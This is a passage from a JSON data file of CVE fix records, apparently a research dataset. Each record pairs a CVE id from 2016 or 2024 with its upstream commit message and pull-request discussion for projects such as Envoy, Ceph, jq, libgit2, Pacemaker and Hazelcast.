            "other_info": "repo: Assorted CVE fixes (IMPORTANT!) CC @envoyproxy/coverage-shephards: FYI only for changes made to `(test/per_file_coverage.sh)`.\nenvoyproxy/coverage-shephards assignee is @RyanTheOptimist\n\n\n<details>\n\t<summary>:cat:</summary>\n\nCaused by: https://github.com/envoyproxy/envoy/pull/32300 was opened by phlax.\n\nsee: [more](https://github.com/envoyproxy/envoy/pull/32300), [trace](https://prod.repokitteh.app/traces/ui/envoyproxy/envoy/53df9610-c75a-11ee-99e2-8c29c907fa82).\n</details> > Can we update the PR description to link to the CVEs that this addresses?\r\n\r\ni think we have been here before 8/\r\n\r\nthis PR will be rebased, the commits contain the linked CVEs\r\n\r\nthis is what needs checking @RyanTheOptimist if you could look through that would be appreciated > > Can we update the PR description to link to the CVEs that this addresses?\r\n> \r\n> i think we have been here before 8/\r\n> \r\n> this PR will be rebased, the commits contain the linked CVEs\r\n> \r\n> this is what needs checking @RyanTheOptimist if you could look through that would be appreciated\r\n\r\nyes, i agree that the code changes look good. It would still be good to copy the links to the CVEs into the PR description so that when we see the commit in git history it has the relevant context. i already have to copy this information to each commit on each branch - ie 20+ and also to the release summaries\r\n\r\ngiven that the information is there **and needs to be checked** ill leave any further copypasta as an exercise for the reader I do not believe that \"Assorted CVE fixes (IMPORTANT!)\" meeds the requirements of a PR description from CONTRIBUTING.md. Feel free to get a second opinion from another maintainer.\r\n\r\n```\r\n* Your PR description should have details on what the PR does. If it fixes an existing issue it\r\n  should end with \"Fixes #XXX\".\r\n``` comment updated I believe [the commit](https://github.com/envoyproxy/envoy/pull/32300/commits/f1cd344edb2775eef8b9d456c76e4a249f1bac8f) to sanitize the proxy protocol values seems wrong. The [sanitizeUtf8String](https://github.com/envoyproxy/envoy/blob/6231a648424d6ae5209d5346960e825a216f95fa/source/common/protobuf/yaml_utility.cc#L341) function used modifies the bytes in a non-recoverable way, but the actual value isn't always meant to be a valid utf8 string. I believe the [proxy protocol spec](https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt) allows for this.\r\n\r\nMaterially, Google's private service connect (PSC) feature encodes a TLV value as a binary encoded int64. With this commit there's no way to recover the original value in most cases. Example value bytes that should be a valid PSC id\r\n`00 22 6b cf 0a 00 00 02` (decodes to `9688686178336770`)\r\n\r\nI think either using set_bytes within `ProtobufWkt::Value` (which doesn't seem to exist today) or escaping the bad bytes in a reverseable way would be necessary. I think this happened because Envoy is using a protobuf string for both moving data around internally, and sending protobufs flattened over the network. I agree this is an unintended change in behavior. I'm not sure what the best way to fix this is. Can you open an issue for this @fedya-at-db ? Thanks, I filed an issue [here](https://github.com/envoyproxy/envoy/issues/32718).",
            "pr_title_words": 5,
            "comments_words": 451,
            "total_other_info_words": 456
        },
        {
            "cve-id": "CVE-2024-0822",
            "commit_url": "https://github.com/oVirt/ovirt-engine/commit/036f617316f6d7077cd213eb613eb4816e33d1fc",
            "commit_msg": "Disable execution of CreateUserSession from GWT code\n\nCreateUserSesssion should be executed only as a part of login flow, so\nexplicitly disable execution from GWT code.\n\nSigned-off-by: Martin Perina <mperina@redhat.com>",
            "commit_msg_words": 29,
            "other_info": "Disable execution of CreateUserSession from GWT code /ost /ost basic-suite-master el9stream (it won't pass all the way, but el9stream should get all the way till UI tests, IIRC) /ost basic-suite-master el9stream /ost basic-suite-master el9stream /ost basic-suite-master el9stream OST passed on CS9, merging",
            "pr_title_words": 7,
            "comments_words": 35,
            "total_other_info_words": 42
        },
        {
            "cve-id": "CVE-2024-24258",
            "commit_url": "https://github.com/freeglut/freeglut/commit/a3810f4e9540286e2d4b8cc97c82ec484de45b9e",
            "commit_msg": "Plug memory leak that happens upon error.\n\nIf fgStructure.CurrentMenu is set when glutAddMenuEntry() or\nglutAddSubMenu() is called the allocated menuEntry variable will\nleak. This commit postpones allocating menuEntry until after the\nerror checks, thereby plugging the memory leak.\n\nThis fixes CVE-2024-24258 and CVE-2024-24259.",
            "commit_msg_words": 43,
            "other_info": "Plug memory leak that happens upon error. I don't know why these CVEs were filed against MuPDF instead of freeglut, and I doubt that these should be of high severity. Anyway, here is my proposed fix. Please let me know if you want me to change it some how. Thanks! I've no idea how a memory leak can be classified as a \"vulnerability\", but nevertheless, it's good to not have any :) Me neither, but thank you for a speedy merge. :)",
            "pr_title_words": 7,
            "comments_words": 75,
            "total_other_info_words": 82
        },
        {
            "cve-id": "CVE-2024-23771",
            "commit_url": "https://github.com/emikulic/darkhttpd/commit/f477619d49f3c4de9ad59bd194265a48ddc03f04",
            "commit_msg": "Don't use strcmp to compare passwords.\n\nAdd password_equal() which tries to avoid leaking the length of the secret\nthrough timing side-channels.\n\nSuggested-by: SUSE Security Team <security@suse.de>",
            "commit_msg_words": 26,
            "other_info": "Try not to leak timing information about the password. Thanks! Large requests are dropped, yes.",
            "pr_title_words": 9,
            "comments_words": 6,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2024-22087",
            "commit_url": "https://github.com/foxweb/pico/commit/e2d172fc2c1384589038fb89dff4d6b65a13bb90",
            "commit_msg": "buffer overflow fix, closes #31",
            "commit_msg_words": 5,
            "other_info": "Buffer overflow fix, closes #31",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2024-21633",
            "commit_url": "https://github.com/iBotPeaches/Apktool/commit/d348c43b24a9de350ff6e5bd610545a10c1fc712",
            "commit_msg": "Prevent arbitrary file writes with malicious resource names. (#3484)\n\n* refactor: rename sanitize function\r\n\r\n* fix: expose getDir\r\n\r\n* fix: safe handling of untrusted resource names\r\n\r\n - fixes: GHSA-2hqv-2xv4-5h5w\r\n\r\n* test: sample file for GHSA-2hqv-2xv4-5h5w\r\n\r\n* refactor: avoid detection of absolute files for resource check\r\n\r\n* chore: enable info mode on gradle\r\n\r\n* test: skip test on windows\r\n\r\n* chore: debug windows handling\r\n\r\n* fix: normalize entry with file separators\r\n\r\n* fix: normalize filepath after cleansing\r\n\r\n* chore: Android paths are not OS specific\r\n\r\n* refactor: use java.nio for path traversal checking\r\n\r\n* chore: align path separator on Windows for Zip files\r\n\r\n* chore: rework towards basic directory traversal\r\n\r\n* chore: remove '--info' on build.yml",
            "commit_msg_words": 115,
            "other_info": "Prevent arbitrary file writes with malicious resource names. I clearly suck at understanding Windows pathing and cross-platform. Will revisit after some learning/research I still think that we can stick to extracting to the same path inside of the apk/zip itself. Basically unzipping but decoding some types on-the-fly. The challenge I suffer with here is that Path/File want to detect the path separator from the host OS. I want to specify one because as you mentioned these are paths correlating to Zip/Apk and then transitioned to host system. So for now - a basic check for traversal, which should suffice. Looks nice. Great effort! @iBotPeaches Can you cut a new release for apktool with this patch? I see that there is 2.10.0 scoped for April. Since this is a security fix, can we get a fixed version in the interim? > @iBotPeaches Can you cut a new release for apktool with this patch? I see that there is 2.10.0 scoped for April. Since this is a security fix, can we get a fixed version in the interim?\r\n\r\nI was planning a patch release this weekend.  > @iBotPeaches Can you cut a new release for apktool with this patch? I see that there is 2.10.0 scoped for April. Since this is a security fix, can we get a fixed version in the interim?\r\n\r\nNow its out - v2.9.2 - https://apktool.org/blog/apktool-2.9.2",
            "pr_title_words": 8,
            "comments_words": 220,
            "total_other_info_words": 228
        }
    ],
    "2016": [
        {
            "cve-id": "CVE-2016-2145",
            "commit_url": "https://github.com/Uninett/mod_auth_mellon/commit/5f03a632c9652687c7dac1ea44f334b9983ab268",
            "commit_msg": "Handle ap_get_client_block() error in am_read_post_data()",
            "commit_msg_words": 5,
            "other_info": "Handle ap_get_client_block() error in am_read_post_data() Thanks for looking into this!\n\nYou are right that we need to handle errors condition from `ap_get_client_block()`. The failure mode is a bit interesting -- as far as I can tell, we will repeatedly call `ap_get_client_block()` with an ever-larger read request. Not sure how many iterations are required before it crashes though.\n\nI do strongly suspect that it crashes on the second iteration, since at that point we are asking Apache to read from something that has already returned an error.\n\nLooking at the code, I think we also need to put an upper bound to the number of bytes that we are willing to read, but I think that belongs in a separate patch.\n Hi olavmrk,\n\nAs I have said, I did not check if the underflow is triggerable. The main fix is to check for the ap_get_client_block() error.\n\nFor the crash, when ap_get_client_block() returns -1, the loop in mod_auth_mellon will allocate an \"infinite\" number of empty bucket brigades.\n\nOn my coredump, you could see that Apache had created approximately 451,000,000 empty brigades before crashing ;-)\n > As I have said, I did not check if the underflow is triggerable. The main fix is to check for the ap_get_client_block() error.\n\nI don't think it can ever happen (`ap_get_client_block()` returning more data than requested) , so I'd remove that condition. Leaving it in will only lead to confusion for future generations.\n\n> For the crash, when ap_get_client_block() returns -1, the loop in mod_auth_mellon will allocate an \"infinite\" number of empty bucket brigades.\n\nOK, that is good to know. Then this crashes the web server process, but doesn't allow for overwriting arbitrary data.\n\nCould you amend your patch with:\n- The check for `(apr_size_t)read_length > bytes_left` removed.\n- Adjustments of `length` and null terminator on early EOF.\n I have updated the patch.\n\nIs it OK for you?\n Yes, thanks!",
            "pr_title_words": 5,
            "comments_words": 308,
            "total_other_info_words": 313
        },
        {
            "cve-id": "CVE-2016-7031",
            "commit_url": "https://github.com/ceph/ceph/commit/99ba6610a8f437604cadf68cbe9969def893e870",
            "commit_msg": "13207: Rados Gateway: Anonymous user is able to read bucket with authenticated read ACL\n\nSigned-off-by: root <rahul.1aggarwal@gmail.com>",
            "commit_msg_words": 17,
            "other_info": "Bug #13207:  Rados Gateway: Anonymous user is able to read bucket with authenticated read ACL @yehudasa \nWhen \"authenticated-read\" ACL is applied on a bucket; anonymous user is also able to read (eg. list) the bucket. But as per S3 documentation only authenticated users should be allowed to access the bucket.\nThis commit tries to fix this problem. A testcase is listed in the bug at http://tracker.ceph.com/issues/13207 \nPlease let me know if this sounds like a genuine issue\n @rahul1aggarwal I understand. My question was about the specific lines change in rgw_op.cc.\n SUCCESS: http://jenkins.ceph.dachary.org/job/ceph/7986/\n- SUCCESS http://jenkins.ceph.dachary.org/job/ceph/LABELS=centos-7&&x86_64/7986/\n SUCCESS: http://jenkins.ceph.dachary.org/job/ceph/7987/\n- SUCCESS http://jenkins.ceph.dachary.org/job/ceph/LABELS=centos-7&&x86_64/7987/\n @rahul1aggarwal ,\ncan you please remove the merge commit and sign the commits.\n SUCCESS: http://jenkins.ceph.dachary.org/job/ceph/9426/\n- SUCCESS http://jenkins.ceph.dachary.org/job/ceph/LABELS=centos-7&&x86_64/9426/\n @oritwas ,\nremoved the merge commit and signed the commit. thanks\n SUCCESS: http://jenkins.ceph.dachary.org/job/ceph/9427/\n- SUCCESS http://jenkins.ceph.dachary.org/job/ceph/LABELS=centos-7&&x86_64/9427/\n SUCCESS: http://jenkins.ceph.dachary.org/job/ceph/9428/\n- SUCCESS http://jenkins.ceph.dachary.org/job/ceph/LABELS=centos-7&&x86_64/9428/\n @oritwas\nthanks for merging",
            "pr_title_words": 15,
            "comments_words": 128,
            "total_other_info_words": 143
        },
        {
            "cve-id": "CVE-2016-2355",
            "commit_url": "https://github.com/dotCMS/core/commit/897f3632d7e471b7a73aabed5b19f6f53d4e5562",
            "commit_msg": "fixes #8848",
            "commit_msg_words": 2,
            "other_info": "Issue 8848 sql injection",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2016-9839",
            "commit_url": "https://github.com/MapServer/MapServer/commit/3d52307cf0033e3275975b668b7138ba1343f28d",
            "commit_msg": "Don't return verbose OGR error messages to clients (#5356)",
            "commit_msg_words": 9,
            "other_info": "OGR error messages too verbose",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2016-4009",
            "commit_url": "https://github.com/python-pillow/Pillow/commit/4e0d9b0b9740d258ade40cce248c93777362ac1e",
            "commit_msg": "fix integer overflow in Resample.c",
            "commit_msg_words": 5,
            "other_info": "Overflow in resample.c, with tests I've added a check in the resize function to check for negative values of the new size. There are several interesting things that could come of that when cast to an unsigned value.",
            "pr_title_words": 5,
            "comments_words": 33,
            "total_other_info_words": 38
        },
        {
            "cve-id": "CVE-2016-4074",
            "commit_url": "https://github.com/jqlang/jq/commit/83e2cf607f3599d208b6b3129092fa7deb2e5292",
            "commit_msg": "Skip printing what's below a MAX_PRINT_DEPTH\n\nThis addresses #1136, and mitigates a stack exhaustion when printing\na very deeply nested term.",
            "commit_msg_words": 21,
            "other_info": "Introduce limits on max parsing and printing depth [![Coverage Status](https://coveralls.io/builds/7527818/badge)](https://coveralls.io/builds/7527818)\n\nCoverage increased (+0.4%) to 85.744% when pulling **478c2a5264587e6e0a308372ed72243590327f33 on wmark:max-depth** into **0b8218515eabf1a967eba0dbcc7a0e5ae031a509 on stedolan:master**.\n Could the commits be squashed and a line like `Fixes: CVE-2016-4074` be added to the commit message? @stedolan Can you please comment on this patch? These and other patches are part of my Docker image, and can be installed with the package for Debian/Ubuntu from here:\r\n\r\nhttps://hub.docker.com/r/blitznote/debootstrap-amd64/\r\n`rkt image fetch blitznote.com/ubuntu:16.04`\r\n\r\nhttps://s.blitznote.com/debs/ubuntu/amd64/all/jq_1.5+dfsg-17bn_amd64.deb @wmark It would be better for distros like ours (SUSE) if the patch were merged upstream. @wmark Can you fix the travis CI test failure? It did fail on *Darwin*, not *Linux*. And seems to be unrelated to my PR. @wmark OK, thanks for the clarification. Maybe we should just not use a recursive print algorithm, instead keeping a logical stack rather than an implicit stack.  We don't, after all, have size limits on arrays, strings, objects...  Why should we have a limit on depth?  If you're not able to produce such a patch and this one is important to you, I could merge it and switch to a non-recursive implementation later. @nicowilliams Yes, to your offer. Please merge this PR for the time being. No, to if I want to rewrite parts of **jq**.\r\n\r\nAs to limits on depth: Any recursive functions needs either to be bound wrt. depth, or a proof that its callstack will always be finite, or that it always is transformed to an iterative equivalent. Rebased and merged.  Thanks!\r\n\r\nI'll eventually undo this and replace it with a non-recursive, explicit stack implementation. Thanks for looking into this! > I'll eventually undo this and replace it with a non-recursive, explicit stack implementation.\r\n\r\nIt'd be nice to have the unlimited depth back. We sometimes use jq for inspecting and modifying deep trees of data and run into the 256 default limit fairly easily. In the meantime, I recently realized that we could explicitly use jq 1.5 instead of 1.6 when we need to avoid it.\r\n\r\nAlternatively, if a limit is to remain, it'd be helpful if its value could be given by a command-line option or env var. e.g. CPython's got a default recursion limit, but you can change it at runtime.",
            "pr_title_words": 8,
            "comments_words": 363,
            "total_other_info_words": 371
        },
        {
            "cve-id": "CVE-2016-7163",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/c16bc057ba3f125051c9966cf1f5b68a05681de4",
            "commit_msg": "Fix an integer overflow issue (#809)\n\nPrevent an integer overflow issue in function opj_pi_create_decode of\r\npi.c.",
            "commit_msg_words": 16,
            "other_info": "Fix an integer overflow issue Thanks stweil. I'll use SIZE_MAX which was defined in opj_malloc.c.\nI think there was something wrong with the **travis** build system so the check was not passed.\n\n```\n$ export CC=clang-3.9\n$ clang-3.9 --version\n/home/travis/build.sh: line 45: clang-3.9: command not found\n......\n./tools/travis-ci/run.sh: line 100: clang-3.9: command not found\n```\n\nBTW, the proof-of-concept file and report have been sent via email on 22nd Aug.\n <a href=\"https:&#x2F;&#x2F;trello.com&#x2F;c&#x2F;bRFBhDNr&#x2F;5-openjpeg-integer-overflow-in-function-opj-pi-create-decode-of-pi-c\"><img src=\"https:&#x2F;&#x2F;github.trello.services&#x2F;images&#x2F;trello-icon.png\" width=\"12\" height=\"12\"> OpenJPEG Integer Overflow in function opj_pi_create_decode of pi.c</a>\n https://pdfium.googlesource.com/pdfium/+/e865ed12c4a476a4c74bf1ae97d3a6fa8ca06f0a/third_party/libopenjpeg20/0002-packet-iterator.patch",
            "pr_title_words": 5,
            "comments_words": 78,
            "total_other_info_words": 83
        },
        {
            "cve-id": "CVE-2016-10129",
            "commit_url": "https://github.com/libgit2/libgit2/commit/2fdef641fd0dd2828bd948234ae86de75221a11a",
            "commit_msg": "smart_pkt: treat empty packet lines as error\n\nThe Git protocol does not specify what should happen in the case\nof an empty packet line (that is a packet line \"0004\"). We\ncurrently indicate success, but do not return a packet in the\ncase where we hit an empty line. The smart protocol was not\nprepared to handle such packets in all cases, though, resulting\nin a `NULL` pointer dereference.\n\nFix the issue by returning an error instead. As such kind of\npackets is not even specified by upstream, this is the right\nthing to do.",
            "commit_msg_words": 95,
            "other_info": "security updates for v0.25",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2016-10130",
            "commit_url": "https://github.com/libgit2/libgit2/commit/b5c6a1b407b7f8b952bded2789593b68b1876211",
            "commit_msg": "http: check certificate validity before clobbering the error variable",
            "commit_msg_words": 9,
            "other_info": "Security updates for v0.24",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2016-7035",
            "commit_url": "https://github.com/ClusterLabs/pacemaker/commit/5d71e65049d143435b03d6b3709d82900f32276f",
            "commit_msg": "High: libcrmcommon: fix CVE-2016-7035 (improper IPC guarding)\n\nIt was discovered that at some not so uncommon circumstances, some\npacemaker daemons could be talked to, via libqb-facilitated IPC, by\nunprivileged clients due to flawed authorization decision.  Depending\non the capabilities of affected daemons, this might equip unauthorized\nuser with local privilege escalation or up to cluster-wide remote\nexecution of possibly arbitrary commands when such user happens to\nreside at standard or remote/guest cluster node, respectively.\n\nThe original vulnerability was introduced in an attempt to allow\nunprivileged IPC clients to clean up the file system materialized\nleftovers in case the server (otherwise responsible for the lifecycle\nof these files) crashes.  While the intended part of such behavior is\nnow effectively voided (along with the unintended one), a best-effort\nfix to address this corner case systemically at libqb is coming along\n(https://github.com/ClusterLabs/libqb/pull/231).\n\nAffected versions:  1.1.10-rc1 (2013-04-17) - 1.1.15 (2016-06-21)\nImpact:             Important\nCVSSv3 ranking:     8.8 : AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H\n\nCredits for independent findings, in chronological order:\n  Jan \"poki\" Pokorn\u00fd, of Red Hat\n  Alain Moulle, of ATOS/BULL",
            "commit_msg_words": 170,
            "other_info": "High: libcrmcommon: fix CVE-2016-7035 (improper IPC guarding) The PR was retargeted for 1.1 branch.",
            "pr_title_words": 7,
            "comments_words": 7,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2016-8600",
            "commit_url": "https://github.com/dotCMS/core/commit/cb84b130065c9eed1d1df9e4770ffa5d4bd30569",
            "commit_msg": "#9330: Remove attribute after getting the info from session",
            "commit_msg_words": 9,
            "other_info": "Issue 9330 captcha",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2016-6132",
            "commit_url": "https://github.com/libgd/libgd/commit/ead349e99868303b37f5e6e9d9d680c9dc71ff8d",
            "commit_msg": "Fix #247, A read out-of-bands was found in the parsing of TGA files (CVE-2016-6132)",
            "commit_msg_words": 14,
            "other_info": "Fix 247 @oerdnj I had already send a very similar patch to Pierre, Remi and Mike via email. I've added a few notes to the code, where I think this PR could be improved. :)\n @cmb69 Thanks, merged your changes.",
            "pr_title_words": 2,
            "comments_words": 38,
            "total_other_info_words": 40
        },
        {
            "cve-id": "CVE-2016-10151",
            "commit_url": "https://github.com/achernya/hesiod/commit/39b21dac9bc6473365de04d94be0da94941c7c73",
            "commit_msg": "Use secure_getenv() when it's available\n\nFactor out logic that attempts to only consult the environment when it's\nsafe to do so into its own function, and use secure_getenv() instead of\ngetenv() if it's available.  Original report from\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1332508",
            "commit_msg_words": 38,
            "other_info": "Use secure_getenv() when it's available Tests pass, merged.\n This has been assigned [CVE-2016-10151](http://www.openwall.com/lists/oss-security/2017/01/21/1)",
            "pr_title_words": 5,
            "comments_words": 8,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2016-7797",
            "commit_url": "https://github.com/ClusterLabs/pacemaker/commit/5ec24a2642bd0854b884d1a9b51d12371373b410",
            "commit_msg": "Fix: remote: cl#5269 - Notify other clients of a new connection only if the handshake has completed (bsc#967388)",
            "commit_msg_words": 18,
            "other_info": "Fix: remote: cl#5269 - Notify other clients of a new connection only if the handshake has completed (bsc#967388)",
            "pr_title_words": 18,
            "comments_words": 0,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2016-6129",
            "commit_url": "https://github.com/libtom/libtomcrypt/commit/5eb9743410ce4657e9d54fef26a2ee31a1b5dd09",
            "commit_msg": "rsa_verify_hash: fix possible bleichenbacher signature attack",
            "commit_msg_words": 6,
            "other_info": "Feature/test rsa pkcs1",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2016-5301",
            "commit_url": "https://github.com/arvidn/libtorrent/commit/acd4e7b87537da82a7765b3b6d14a1ffddd7b480",
            "commit_msg": "fixed crash on invalid input in http_parser",
            "commit_msg_words": 7,
            "other_info": "fixed crash on invalid input in http_parser ## [Current coverage](https://codecov.io/gh/arvidn/libtorrent/pull/782?src=pr) is **56.21%**\n\n> Merging [#782](https://codecov.io/gh/arvidn/libtorrent/pull/782?src=pr) into [RC_1_1](https://codecov.io/gh/arvidn/libtorrent/branch/RC_1_1?src=pr) will decrease coverage by **0.21%**\n1. 16 files (not in diff) in `src` were modified. [more](https://codecov.io/gh/arvidn/libtorrent/commit/c7d39db7656b4d8cd05b49ee1e3c24bd88aedc07/changes?src=pr#737263) \n   - Misses `+127` \n   - Partials `-12` \n   - Hits `-115`\n2. 7 files (not in diff) in `include/libtorrent` were modified. [more](https://codecov.io/gh/arvidn/libtorrent/commit/c7d39db7656b4d8cd05b49ee1e3c24bd88aedc07/changes?src=pr#696E636C7564652F6C6962746F7272656E74)\n\n``` diff\n@@             RC_1_1       #782   diff @@\n==========================================\n  Files           264        264          \n  Lines         43768      43791    +23   \n  Methods        4572       4572          \n  Messages          0          0          \n  Branches       7264       7269     +5   \n==========================================\n- Hits          24707      24615    -92   \n- Misses        14808      14935   +127   \n+ Partials       4253       4241    -12   \n```\n\n> Powered by [Codecov](https://codecov.io?src=pr). Last updated by [ec18249...c7d39db](https://codecov.io/gh/arvidn/libtorrent/compare/ec182492cc91ec71f3c48c75a27ce1d644130bc3...c7d39db7656b4d8cd05b49ee1e3c24bd88aedc07)",
            "pr_title_words": 7,
            "comments_words": 96,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2016-1133",
            "commit_url": "https://github.com/h2o/h2o/commit/461ae1ae6d9c11441f5a622175b211aba104e9b2",
            "commit_msg": "uri-escape the redirect path",
            "commit_msg_words": 4,
            "other_info": "uri-escape the user-supplied portion of the redirect path (CVE-2016-1133)",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2016-9189",
            "commit_url": "https://github.com/python-pillow/Pillow/commit/c50ebe6459a131a1ea8ca531f10da616d3ceaa0f",
            "commit_msg": "Map.c overflow fixes",
            "commit_msg_words": 3,
            "other_info": "Fixes for #2105",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2016-5746",
            "commit_url": "https://github.com/openSUSE/libstorage-ng/commit/94caa94fdc855d982b4f4de5a0f865a7cb734acc",
            "commit_msg": "Use stdin, not tmp files for passwords (bsc#986971)",
            "commit_msg_words": 8,
            "other_info": "Use stdin, not tmp files for passwords (bsc#986971) LGTM",
            "pr_title_words": 8,
            "comments_words": 1,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2016-7445",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/7c8620461f4a65e56c19633fe6a883e6cdb5f70f",
            "commit_msg": "Fix PNM file reading\n\nMalformed PNM file could cause a crash in opj_compress.\nChecks were added to prevent this.\n\nFixes #843\nUpdates #440",
            "commit_msg_words": 23,
            "other_info": "Fix PNM file reading @malaterre Please back port to branch-2.1",
            "pr_title_words": 4,
            "comments_words": 6,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2016-4040",
            "commit_url": "https://github.com/dotCMS/core/commit/bc4db5d71dc67015572f8e4c6fdf87e29b854d02",
            "commit_msg": "fixes #8840 sort by sanitizing and email header injection",
            "commit_msg_words": 9,
            "other_info": "fixes #8840 sort by sanitizing and email header injection",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2016-10750",
            "commit_url": "https://github.com/hazelcast/hazelcast/commit/c1c31359a1df953e79a9ca9b6c54b3cdbfef11e9",
            "commit_msg": "Add basic protection against untrusted deserialization.",
            "commit_msg_words": 6,
            "other_info": "Add basic protection against untrusted deserialization by introducing blacklisting/whitelisting capabilities @Donnerbart, Thanks for the comments, I'll work on them.\r\n\r\nI'll rework the configuration to avoid using properties.\r\n\r\nUnill the changes are in place, I'm flagging this PR with a \"Don't merge\" prefix. @drosenbauer Thanks for comments.\r\n\r\nCurrent plan is to have following configuration:\r\n```xml\r\n<hazelcast>\r\n    <serialization>\r\n        <java-serialization-filter>\r\n            <whitelist>\r\n                <class>java.lang.String</class>\r\n                <class>example.Foo</class>\r\n                <package>com.acme.app</package>\r\n                <package>com.acme.app.subpkg</package>\r\n            </whitelist>\r\n            <blacklist>\r\n                <class>com.acme.app.BeanComparator</class>\r\n            </blacklist>\r\n        </java-serialization-filter>\r\n    </serialization>\r\n</hazelcast>\r\n```\r\n\r\nThe exception, which will be thrown by look-ahead ObjectInputStream is `java.lang.SecurityException`. The deserializer will wrap it into `HazelcastSerializationException`.\r\n\r\n**Filtering rules**\r\n* When whitelist is not provided:\r\n  1. if the deserialized object's getClass().getName() is blacklisted or getClass().getPackage().getName() is blacklisted, then deserialization fails;\r\n  1. deserialization is allowed otherwise.\r\n* When whitelist is provided:\r\n  1. if the deserialized object's getClass().getName() is blacklisted or getClass().getPackage().getName() is blacklisted, then deserialization fails;\r\n  1. if the deserialized object's getClass().getName() is whitelisted or getClass().getPackage().getName() is whitelisted, then deserialization is allowed;\r\n  1. deserialization fails otherwise. There is quite a lot of 'repetition'\r\n\r\nSerializationClassNameFilter\r\nClassFilterList\r\nShadeOfGreyList\r\n\r\nThey all contain the same thing.. list of packages and list of classes. This task has been moved to the 3.11 release. So I'm going to update the milestone. I've updated the PR. The comments were mostly addressed.\r\n\r\nThe feature is not enabled by default now. The default blacklist is used after adding the `<java-serialization-filter/>` element. \r\n\r\nI don't think the package name extraction from a class name is a litter, I like it more than adding classnames without limit to the classname `Set`, or using an overkill like a cache with a proper eviction mechanism. As the feature is not enabled by default, I think we are safe here now from the performance PoV. Do you agree @pveentjer? # [Codecov](https://codecov.io/gh/hazelcast/hazelcast/pull/12230?src=pr&el=h1) Report\n> Merging [#12230](https://codecov.io/gh/hazelcast/hazelcast/pull/12230?src=pr&el=desc) into [master](https://codecov.io/gh/hazelcast/hazelcast/commit/56f63a9b3ae20488ef6e2c57dc47ed2be2b53253?src=pr&el=desc) will **increase** coverage by `0.2%`.\n> The diff coverage is `80.4%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/graphs/tree.svg?token=8zC1zaT3xz&height=150&src=pr&width=650)](https://codecov.io/gh/hazelcast/hazelcast/pull/12230?src=pr&el=tree)\n\n```diff\n@@             Coverage Diff             @@\n##             master   #12230     +/-   ##\n===========================================\n+ Coverage     76.22%   76.43%   +0.2%     \n- Complexity    34722    34868    +146     \n===========================================\n  Files          3032     3035      +3     \n  Lines        129595   129819    +224     \n  Branches      15168    15203     +35     \n===========================================\n+ Hits          98785    99227    +442     \n+ Misses        25073    24913    -160     \n+ Partials       5737     5679     -58\n```\n\n\n| [Impacted Files](https://codecov.io/gh/hazelcast/hazelcast/pull/12230?src=pr&el=tree) | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| [...rialization/impl/AbstractSerializationService.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9pbnRlcm5hbC9zZXJpYWxpemF0aW9uL2ltcGwvQWJzdHJhY3RTZXJpYWxpemF0aW9uU2VydmljZS5qYXZh) | `87.59% <100%> (+0.58%)` | `86 <0> (-1)` | :arrow_down: |\n| [...om/hazelcast/nio/SerializationClassNameFilter.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9uaW8vU2VyaWFsaXphdGlvbkNsYXNzTmFtZUZpbHRlci5qYXZh) | `100% <100%> (\u00f8)` | `5 <5> (?)` | |\n| [...ation/impl/DefaultSerializationServiceBuilder.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9pbnRlcm5hbC9zZXJpYWxpemF0aW9uL2ltcGwvRGVmYXVsdFNlcmlhbGl6YXRpb25TZXJ2aWNlQnVpbGRlci5qYXZh) | `81.86% <100%> (+1.64%)` | `56 <0> (+1)` | :arrow_up: |\n| [...nal/serialization/impl/JavaDefaultSerializers.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9pbnRlcm5hbC9zZXJpYWxpemF0aW9uL2ltcGwvSmF2YURlZmF1bHRTZXJpYWxpemVycy5qYXZh) | `86.33% <100%> (+0.19%)` | `1 <0> (\u00f8)` | :arrow_down: |\n| 